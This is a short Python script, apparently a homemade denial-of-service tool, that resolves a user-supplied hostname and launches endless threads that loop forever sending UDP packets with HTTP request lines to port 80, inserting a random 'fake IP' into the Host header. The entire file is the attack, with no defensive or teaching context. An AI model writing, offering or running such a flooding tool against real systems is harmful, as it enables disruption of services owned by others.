import socket, random, time
import threading
 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
def get_ip(link):
    return socket.gethostbyname(link)

def get_port():
    return 80 

link = input("Enter link: ")
print("Link: ", link)
ip = get_ip(link)
port = get_port()
 
print("IP: ", ip)
print("Port: ", port)

fake_ip = ""
for i in range(4):
    fake_ip += str(random.randint(0, 255)) + "."
fake_ip = fake_ip[:-1]
 
print("Fake IP: ", fake_ip)

time.sleep(5)

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip, port))
        s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
        s.close()
        
        global already_connected  
        already_connected += 1
        if already_connected % 500 == 0:
            print("Already connected: ", already_connected)
        
while True:
    thread = threading.Thread(target=attack)
    thread.start()